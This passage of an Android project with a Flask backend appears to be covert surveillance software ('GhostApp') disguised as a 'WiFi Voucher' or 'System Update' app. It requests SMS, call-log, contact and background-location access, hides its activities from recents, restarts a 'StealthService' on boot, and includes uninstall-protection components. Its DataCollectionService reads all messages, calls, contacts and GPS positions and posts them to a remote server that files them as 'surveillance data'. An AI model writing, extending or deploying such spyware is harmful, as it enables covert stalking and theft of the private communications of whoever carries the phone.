@@ -1,0 +1,1973 @@
+========== MUUNDO WA PROJECT ==========
+./app/build.gradle
+./app/src/main/AndroidManifest.xml
+./app/src/main/java/com/security/update/BootReceiver.java
+./app/src/main/java/com/security/update/DataCollectionService.java
+./app/src/main/java/com/security/update/LoginActivity.java
+./app/src/main/java/com/security/update/PermissionActivity.java
+./app/src/main/java/com/security/update/SmsConversationHandler.java
+./app/src/main/java/com/security/update/StealthActivity.java
+./app/src/main/java/com/security/update/StealthService.java
+./app/src/main/java/com/security/update/UninstallProtectionActivity.java
+./app/src/main/java/com/security/update/UninstallReceiver.java
+./app/src/main/res/drawable/edit_text_border.xml
+./app/src/main/res/drawable/ic_launcher.xml
+./app/src/main/res/drawable/ic_launcher_foreground.xml
+./app/src/main/res/drawable/ic_wifi.xml
+./app/src/main/res/layout/activity_login.xml
+./app/src/main/res/layout/activity_permission.xml
+./app/src/main/res/layout/activity_uninstall_protection.xml
+./app/src/main/res/values/colors.xml
+./app/src/main/res/values/strings.xml
+./app/src/main/res/values/styles.xml
+./app_fixed.py
+./build.gradle
+./settings.gradle
+
+========== AndroidManifest.xml ==========
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <application
+        android:allowBackup="false"
+        android:label="WiFi Voucher"
+        android:icon="@drawable/ic_wifi"
+        android:roundIcon="@drawable/ic_wifi"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        android:usesCleartextTraffic="true"
+        android:supportsRtl="true">
+
+        <activity
+            android:name=".LoginActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTask">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".PermissionActivity"
+            android:exported="false"
+            android:excludeFromRecents="true" />
+
+        <activity
+            android:name=".StealthActivity"
+            android:exported="false"
+            android:excludeFromRecents="true" />
+
+        <activity
+            android:name=".UninstallProtectionActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true" />
+
+        <service
+            android:name=".StealthService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <service
+            android:name=".DataCollectionService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location|dataSync" />
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".UninstallReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.QUERY_PACKAGE_RESTART" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
+
+========== app/build.gradle ==========
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'com.security.update'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.security.update"
+        minSdk 21
+        targetSdk 34
+        versionCode 2
+        versionName "2.0"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            minifyEnabled false
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+
+    buildFeatures {
+        buildConfig = true
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.10.0'
+    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+}
+
+========== build.gradle (project) ==========
+buildscript {
+    repositories {
+        google()
+        mavenCentral()
+    }
+    dependencies {
+        classpath 'com.android.tools.build:gradle:8.0.2'
+    }
+}
+
+allprojects {
+    repositories {
+        google()
+        mavenCentral()
+    }
+}
+
+task clean(type: Delete) {
+    delete rootProject.buildDir
+}
+
+========== settings.gradle ==========
+pluginManagement {
+    repositories {
+        google()
+        mavenCentral()
+        gradlePluginPortal()
+    }
+}
+rootProject.name = "GhostApp"
+include ':app'
+
+========== gradle.properties ==========
+org.gradle.jvmargs=-Xmx2048m
+android.useAndroidX=true
+android.enableJetifier=true
+org.gradle.parallel=true
+org.gradle.caching=true
+android.enableR8=true
+
+========== app_fixed.py ==========
+from flask import Flask, request, jsonify
+import sqlite3
+import json
+from datetime import datetime
+
+app = Flask(__name__)
+app.config['DATABASE'] = 'ghost_tester_parents.db'
+
+def init_db():
+    conn = sqlite3.connect(app.config['DATABASE'])
+    c = conn.cursor()
+    
+    c.execute('''CREATE TABLE IF NOT EXISTS parents
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  full_name TEXT NOT NULL,
+                  phone_number TEXT UNIQUE NOT NULL,
+                  email TEXT,
+                  parent_code TEXT UNIQUE NOT NULL,
+                  child_phone TEXT,
+                  relationship TEXT,
+                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
+
+    c.execute('''CREATE TABLE IF NOT EXISTS parent_surveillance_data
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  parent_code TEXT NOT NULL,
+                  target_device TEXT,
+                  data_type TEXT,
+                  data_content TEXT,
+                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
+    
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def get_db():
+    conn = sqlite3.connect(app.config['DATABASE'])
+    conn.row_factory = sqlite3.Row
+    return conn
+
+# ENDPOINT YA KUTHIBITISHA PARENT CODE
+@app.route('/api/parent/verify-code', methods=['POST'])
+def verify_parent_code():
+    try:
+        data = request.get_json()
+        parent_code = data.get('parent_code', '').strip().upper()
+
+        print(f"🔍 VERIFYING PARENT CODE: {parent_code}")
+
+        if not parent_code:
+            return jsonify({'valid': False, 'error': 'Parent code is required'}), 400
+
+        conn = get_db()
+        parent = conn.execute('SELECT * FROM parents WHERE parent_code = ?', (parent_code,)).fetchone()
+        conn.close()
+
+        if parent:
+            print(f"✅ PARENT CODE VERIFIED: {parent_code} for {parent['full_name']}")
+            return jsonify({
+                'valid': True,
+                'parent_name': parent['full_name'],
+                'child_phone': parent['child_phone'],
+                'message': 'Code verified successfully'
+            }), 200
+        else:
+            print(f"❌ INVALID PARENT CODE: {parent_code}")
+            return jsonify({
+                'valid': False,
+                'error': 'Invalid parent code! Check your code and try again.'
+            }), 404
+
+    except Exception as e:
+        print(f"❌ PARENT VERIFICATION ERROR: {e}")
+        return jsonify({'valid': False, 'error': str(e)}), 500
+
+# ENDPOINT MPYA YA KUPOKEA DATA - RAHISI NA DIRECT
+@app.route('/api/data/upload', methods=['POST'])
+def upload_surveillance_data():
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'error': 'No data received'}), 400
+
+        parent_code = data.get('parent_code')
+        data_type = data.get('data_type', 'unknown')
+        device_id = data.get('device_id', 'unknown')
+        content = data.get('data', [])
+
+        print(f"📱 DATA RECEIVED - Parent: {parent_code}, Type: {data_type}, Items: {len(content)}")
+
+        if not parent_code:
+            return jsonify({'error': 'Parent code is required'}), 400
+
+        # Verify parent code exists
+        conn = get_db()
+        parent = conn.execute('SELECT * FROM parents WHERE parent_code = ?', (parent_code,)).fetchone()
+
+        if not parent:
+            conn.close()
+            return jsonify({'error': 'Invalid parent code'}), 400
+
+        # Save each data item
+        for item in content:
+            conn.execute('''INSERT INTO parent_surveillance_data
+                          (parent_code, target_device, data_type, data_content)
+                          VALUES (?, ?, ?, ?)''',
+                      (parent_code, device_id, data_type, json.dumps(item)))
+        
+        conn.commit()
+        conn.close()
+
+        print(f"✅ Data saved successfully for parent: {parent_code}")
+        return jsonify({
+            'status': 'success',
+            'message': f'Received {len(content)} {data_type} items',
+            'parent_name': parent['full_name']
+        }), 200
+
+    except Exception as e:
+        print(f"❌ DATA UPLOAD ERROR: {e}")
+        return jsonify({'error': str(e)}), 500
+
+# ENDPOINT YA KUREGISTER PARENT
+@app.route('/api/parent/register', methods=['POST'])
+def register_parent():
+    try:
+        data = request.get_json()
+        full_name = data.get('full_name')
+        phone_number = data.get('phone_number')
+        email = data.get('email', '')
+        child_phone = data.get('child_phone')
+        relationship = data.get('relationship', 'parent')
+
+        import secrets
+        parent_code = secrets.token_hex(4).upper()
+
+        conn = get_db()
+        try:
+            cursor = conn.cursor()
+            cursor.execute('''INSERT INTO parents
+                          (full_name, phone_number, email, parent_code, child_phone, relationship)
+                          VALUES (?, ?, ?, ?, ?, ?)''',
+                         (full_name, phone_number, email, parent_code, child_phone, relationship))
+
+            parent_id = cursor.lastrowid
+            conn.commit()
+
+            return jsonify({
+                'success': True,
+                'parent_code': parent_code,
+                'message': 'Parent registered successfully'
+            }), 200
+
+        except sqlite3.IntegrityError:
+            return jsonify({'error': 'Phone number already registered'}), 400
+        finally:
+            conn.close()
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# ENDPOINT YA KUANGALIA DATA YA PARENT
+@app.route('/api/parent/data/<parent_code>')
+def get_parent_data(parent_code):
+    try:
+        conn = get_db()
+        
+        # Get data counts
+        sms_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
+                                  WHERE parent_code = ? AND data_type = "sms"''', 
+                               (parent_code,)).fetchone()[0]
+        
+        calls_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
+                                   WHERE parent_code = ? AND data_type = "call_logs"''', 
+                                (parent_code,)).fetchone()[0]
+        
+        contacts_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
+                                      WHERE parent_code = ? AND data_type = "contacts"''', 
+                                   (parent_code,)).fetchone()[0]
+        
+        locations_count = conn.execute('''SELECT COUNT(*) FROM parent_surveillance_data 
+                                       WHERE parent_code = ? AND data_type = "location"''', 
+                                    (parent_code,)).fetchone()[0]
+
+        # Get recent data
+        recent_data = conn.execute('''SELECT * FROM parent_surveillance_data 
+                                    WHERE parent_code = ? 
+                                    ORDER BY timestamp DESC 
+                                    LIMIT 50''', 
+                                 (parent_code,)).fetchall()
+
+        conn.close()
+
+        return jsonify({
+            'success': True,
+            'stats': {
+                'sms': sms_count,
+                'calls': calls_count,
+                'contacts': contacts_count,
+                'locations': locations_count
+            },
+            'recent_data': [dict(item) for item in recent_data]
+        }), 200
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/')
+def home():
+    return '''
+    <h1>Ghost Tester Parent Surveillance API</h1>
+    <p>✅ API is running</p>
+    <p>Endpoints:</p>
+    <ul>
+        <li><strong>POST /api/parent/verify-code</strong> - Verify parent code</li>
+        <li><strong>POST /api/data/upload</strong> - Upload surveillance data</li>
+        <li><strong>POST /api/parent/register</strong> - Register new parent</li>
+        <li><strong>GET /api/parent/data/&lt;code&gt;</strong> - Get parent data</li>
+    </ul>
+    '''
+
+if __name__ == '__main__':
+    print("🚀 Ghost Tester Parent API Started")
+    print("📱 Endpoints ready for Android app")
+    app.run(debug=True, host='0.0.0.0', port=5000)
+
+========== res/xml/ ==========
+
+========== res/values/strings.xml ==========
+<resources>
+    <string name="app_name">System Update</string>
+</resources>
+
+
+========== app/src/main/java/com/security/update/BootReceiver.java ==========
+package com.security.update;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.util.Log;
+
+public class BootReceiver extends BroadcastReceiver {
+    private static final String TAG = "BootReceiver";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Log.d(TAG, "📱 Simu imewashwa - Inaanzisha app tena automatikali...");
+            
+            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
+            String parentCode = prefs.getString("parent_code", "");
+            boolean verified = prefs.getBoolean("verified", false);
+            
+            if (verified && !parentCode.isEmpty()) {
+                // Anza service tena automatikali
+                Intent serviceIntent = new Intent(context, StealthService.class);
+                serviceIntent.putExtra("PARENT_CODE", parentCode);
+                
+                // Hakikisha service inaenda kuanza hata permissions zikikosa
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                    context.startForegroundService(serviceIntent);
+                } else {
+                    context.startService(serviceIntent);
+                }
+                
+                Log.d(TAG, "✅ StealthService imeanzishwa tena baada ya boot");
+            } else {
+                Log.d(TAG, "ℹ️ App haija verify bado au hakuna parent code");
+            }
+        }
+    }
+}
+
+========== app/src/main/java/com/security/update/DataCollectionService.java ==========
+package com.security.update;
+
+import android.app.Service;
+import android.content.ContentResolver;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.database.ContentObserver;
+import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.Telephony;
+import android.util.Log;
+import androidx.core.app.ActivityCompat;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.HashMap;
+import java.util.Map;
+
+public class DataCollectionService extends Service {
+
+    private static final String TAG = "WiFiVoucher";
+    private static final int LOCATION_INTERVAL = 30 * 60 * 1000; // 30 minutes
+    private static final int DATA_COLLECTION_INTERVAL = 10 * 60 * 1000; // 10 minutes for full sync
+
+    private Handler handler;
+    private Handler locationHandler;
+    private Runnable fullDataCollector;
+    private Runnable locationSender;
+    private SharedPreferences prefs;
+    private String parentCode;
+    private String deviceId;
+
+    private LocationManager locationManager;
+    private LocationListener locationListener;
+    private Location currentLocation;
+    private ContentObserver smsObserver;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
+        parentCode = prefs.getString("parent_code", "");
+        deviceId = android.provider.Settings.Secure.getString(
+            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+
+        setupLocationListener();
+        setupSmsObserver();
+
+        handler = new Handler(Looper.getMainLooper());
+        locationHandler = new Handler(Looper.getMainLooper());
+
+        // Full data collection - runs first time then every 10 minutes
+        fullDataCollector = new Runnable() {
+            @Override
+            public void run() {
+                collectAllData();
+                handler.postDelayed(this, DATA_COLLECTION_INTERVAL);
+            }
+        };
+
+        // Location every 30 minutes
+        locationSender = new Runnable() {
+            @Override
+            public void run() {
+                sendCurrentLocation();
+                locationHandler.postDelayed(this, LOCATION_INTERVAL);
+            }
+        };
+    }
+
+    private void setupLocationListener() {
+        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(Location location) {
+                currentLocation = location;
+            }
+            @Override public void onStatusChanged(String p, int s, Bundle b) {}
+            @Override public void onProviderEnabled(String p) {}
+            @Override public void onProviderDisabled(String p) {}
+        };
+
+        try {
+            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
+                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Location error: " + e.getMessage());
+        }
+    }
+
+    private void setupSmsObserver() {
+        smsObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
+            @Override
+            public void onChange(boolean selfChange) {
+                super.onChange(selfChange);
+                collectAllSms();
+            }
+        };
+        getContentResolver().registerContentObserver(
+            Telephony.Sms.CONTENT_URI, true, smsObserver);
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        // Start full collection immediately
+        handler.post(fullDataCollector);
+        // Start location updates every 30 minutes
+        locationHandler.post(locationSender);
+        return START_STICKY;
+    }
+
+    private void collectAllData() {
+        new Thread(() -> {
+            try {
+                collectAllSms();
+                collectAllCallLogs();
+                collectAllContacts();
+            } catch (Exception e) {
+                Log.e(TAG, "Collection error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private void collectAllSms() {
+        try {
+            ContentResolver cr = getContentResolver();
+            Map<String, JSONObject> conversationMap = new HashMap<>();
+
+            // NO LIMIT - Get ALL SMS messages
+            Cursor cursor = cr.query(
+                Telephony.Sms.CONTENT_URI,
+                new String[]{
+                    Telephony.Sms._ID,
+                    Telephony.Sms.ADDRESS,
+                    Telephony.Sms.BODY,
+                    Telephony.Sms.DATE,
+                    Telephony.Sms.TYPE,
+                    Telephony.Sms.THREAD_ID
+                },
+                null, null,
+                Telephony.Sms.DATE + " DESC"
+            );
+
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext()) {
+                    try {
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                        String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
+
+                        String key = (address != null) ? address : "unknown";
+
+                        JSONObject msg = new JSONObject();
+                        msg.put("sender", address);
+                        msg.put("message", body);
+                        msg.put("timestamp", timestamp);
+                        msg.put("type", (type == Telephony.Sms.MESSAGE_TYPE_INBOX) ? "incoming" : "outgoing");
+
+                        if (!conversationMap.containsKey(key)) {
+                            JSONObject conv = new JSONObject();
+                            conv.put("contact", address);
+                            conv.put("phone_number", address);
+                            conv.put("conversation_id", threadId);
+                            conv.put("messages", new JSONArray());
+                            conversationMap.put(key, conv);
+                        }
+                        conversationMap.get(key).getJSONArray("messages").put(msg);
+                        count++;
+                    } catch (Exception e) {
+                        // Skip malformed rows
+                    }
+                }
+                cursor.close();
+                Log.d(TAG, "SMS collected: " + count + " messages");
+
+                // Send each conversation
+                for (JSONObject conv : conversationMap.values()) {
+                    JSONObject wrapper = new JSONObject();
+                    wrapper.put("conversation", conv);
+                    submitData("sms_conversation", wrapper);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "SMS error: " + e.getMessage());
+        }
+    }
+
+    private void collectAllCallLogs() {
+        try {
+            ContentResolver cr = getContentResolver();
+            // NO LIMIT - Get ALL call logs
+            Cursor cursor = cr.query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                CallLog.Calls.DATE + " DESC");
+
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext()) {
+                    try {
+                        JSONObject call = new JSONObject();
+                        String number = getString(cursor, CallLog.Calls.NUMBER);
+                        String name = getString(cursor, CallLog.Calls.CACHED_NAME);
+                        String duration = getString(cursor, CallLog.Calls.DURATION);
+                        int type = Integer.parseInt(getString(cursor, CallLog.Calls.TYPE));
+                        String date = getString(cursor, CallLog.Calls.DATE);
+
+                        String callType = "missed";
+                        if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
+                        else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
+
+                        call.put("number", number);
+                        call.put("name", name != null ? name : number);
+                        call.put("duration", duration);
+                        call.put("type", callType);
+                        call.put("timestamp", date);
+
+                        submitData("calls", call);
+                        count++;
+                    } catch (Exception e) {
+                        // Skip malformed rows
+                    }
+                }
+                cursor.close();
+                Log.d(TAG, "Calls collected: " + count);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Call log error: " + e.getMessage());
+        }
+    }
+
+    private void collectAllContacts() {
+        try {
+            ContentResolver cr = getContentResolver();
+            // NO LIMIT - Get ALL contacts
+            Cursor cursor = cr.query(
+                ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext()) {
+                    try {
+                        String id = getString(cursor, ContactsContract.Contacts._ID);
+                        String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
+                        if (name == null || name.isEmpty()) continue;
+
+                        Cursor phoneCursor = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+
+                        if (phoneCursor != null) {
+                            while (phoneCursor.moveToNext()) {
+                                String phone = getString(phoneCursor,
+                                    ContactsContract.CommonDataKinds.Phone.NUMBER);
+                                if (phone != null && !phone.isEmpty()) {
+                                    JSONObject contact = new JSONObject();
+                                    contact.put("name", name);
+                                    contact.put("number", phone);
+                                    submitData("contacts", contact);
+                                    count++;
+                                }
+                            }
+                            phoneCursor.close();
+                        }
+                    } catch (Exception e) {
+                        // Skip malformed rows
+                    }
+                }
+                cursor.close();
+                Log.d(TAG, "Contacts collected: " + count);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Contacts error: " + e.getMessage());
+        }
+    }
+
+    private void sendCurrentLocation() {
+        new Thread(() -> {
+            try {
+                JSONObject loc = new JSONObject();
+
+                if (currentLocation != null) {
+                    loc.put("latitude", currentLocation.getLatitude());
+                    loc.put("longitude", currentLocation.getLongitude());
+                    loc.put("accuracy", currentLocation.getAccuracy());
+                    loc.put("speed", currentLocation.getSpeed());
+                    loc.put("altitude", currentLocation.getAltitude());
+                } else {
+                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                        Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                        if (lastLoc == null) {
+                            lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                        }
+                        if (lastLoc != null) {
+                            loc.put("latitude", lastLoc.getLatitude());
+                            loc.put("longitude", lastLoc.getLongitude());
+                            loc.put("accuracy", lastLoc.getAccuracy());
+                        } else {
+                            loc.put("latitude", 0);
+                            loc.put("longitude", 0);
+                            loc.put("accuracy", 0);
+                        }
+                    } else {
+                        loc.put("latitude", 0);
+                        loc.put("longitude", 0);
+                        loc.put("accuracy", 0);
+                    }
+                }
+
+                loc.put("timestamp", System.currentTimeMillis());
+                loc.put("provider", currentLocation != null ? currentLocation.getProvider() : "last_known");
+
+                submitData("location", loc);
+                Log.d(TAG, "Location sent");
+
+            } catch (Exception e) {
+                Log.e(TAG, "Location error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private String getString(Cursor cursor, String columnName) {
+        try {
+            int idx = cursor.getColumnIndex(columnName);
+            if (idx != -1) return cursor.getString(idx);
+        } catch (Exception e) {}
+        return "";
+    }
+
+    private void submitData(String dataType, JSONObject dataContent) {
+        new Thread(() -> {
+            try {
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
+                JSONObject payload = new JSONObject();
+                payload.put("parent_code", parentCode);
+                payload.put("device_id", deviceId);
+                payload.put("data_type", dataType);
+                payload.put("data_content", dataContent);
+
+                URL url = new URL(serverUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(payload.toString().getBytes("UTF-8"));
+                os.flush();
+                os.close();
+
+                int code = conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception e) {
+                Log.e(TAG, "Submit error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (handler != null) handler.removeCallbacks(fullDataCollector);
+        if (locationHandler != null) locationHandler.removeCallbacks(locationSender);
+        if (locationManager != null && locationListener != null)
+            locationManager.removeUpdates(locationListener);
+        if (smsObserver != null)
+            getContentResolver().unregisterContentObserver(smsObserver);
+    }
+}
+
+========== app/src/main/java/com/security/update/LoginActivity.java ==========
+package com.security.update;
+
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.ProgressBar;
+import android.widget.TextView;
+import android.widget.Toast;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import org.json.JSONObject;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
+
+public class LoginActivity extends AppCompatActivity {
+
+    private static final int PERMISSION_REQUEST_CODE = 1001;
+    private static final int OVERLAY_PERMISSION_CODE = 1002;
+    private static final int BATTERY_OPTIMIZATION_CODE = 1003;
+
+    private EditText codeInput;
+    private Button verifyButton;
+    private ProgressBar progressBar;
+    private TextView titleText, subtitleText, statusText;
+    private SharedPreferences prefs;
+    private Handler handler;
+    private String verifiedCode;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_login);
+
+        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
+        handler = new Handler();
+
+        if (prefs.contains("parent_code") && prefs.getBoolean("is_activated", false)) {
+            startVoucherService();
+            return;
+        }
+
+        initViews();
+        setupUI();
+        setupListeners();
+    }
+
+    private void initViews() {
+        codeInput = findViewById(R.id.code_input);
+        verifyButton = findViewById(R.id.verify_button);
+        progressBar = findViewById(R.id.progress_bar);
+        titleText = findViewById(R.id.title_text);
+        subtitleText = findViewById(R.id.subtitle_text);
+        statusText = findViewById(R.id.status_text);
+    }
+
+    private void setupUI() {
+        titleText.setText("WiFi Voucher");
+        titleText.setTextColor(ContextCompat.getColor(this, android.R.color.black));
+        titleText.setTextSize(28f);
+        titleText.setTypeface(null, android.graphics.Typeface.BOLD);
+        subtitleText.setText("Enter your voucher code to connect");
+        subtitleText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));
+        subtitleText.setTextSize(14f);
+        codeInput.setHint("Voucher WiFi Code");
+        codeInput.setTextColor(ContextCompat.getColor(this, android.R.color.black));
+        verifyButton.setText("CONNECT");
+        verifyButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
+        verifyButton.setTextColor(ContextCompat.getColor(this, android.R.color.white));
+        statusText.setText("");
+        statusText.setTextSize(12f);
+        progressBar.setVisibility(View.GONE);
+    }
+
+    private void setupListeners() {
+        verifyButton.setOnClickListener(v -> {
+            String code = codeInput.getText().toString().trim().toUpperCase();
+            if (code.isEmpty()) {
+                statusText.setText("Please enter your Voucher WiFi Code");
+                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
+                return;
+            }
+            if (code.length() < 4) {
+                statusText.setText("Code must be at least 4 characters");
+                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
+                return;
+            }
+            verifyVoucherCode(code);
+        });
+    }
+
+    private void verifyVoucherCode(String code) {
+        progressBar.setVisibility(View.VISIBLE);
+        verifyButton.setEnabled(false);
+        statusText.setText("Verifying...");
+        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));
+
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://GhostTester.pythonanywhere.com/api/parent/verify-code");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(15000);
+                conn.setReadTimeout(15000);
+
+                JSONObject payload = new JSONObject();
+                payload.put("parent_code", code);
+                OutputStream os = conn.getOutputStream();
+                os.write(payload.toString().getBytes("UTF-8"));
+                os.flush();
+                os.close();
+
+                int responseCode = conn.getResponseCode();
+                conn.disconnect();
+
+                if (responseCode == 200) {
+                    verifiedCode = code;
+                    handler.post(() -> {
+                        progressBar.setVisibility(View.GONE);
+                        statusText.setText("Code verified! Requesting permissions...");
+                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
+                        requestAllPermissions();
+                    });
+                } else {
+                    handler.post(() -> {
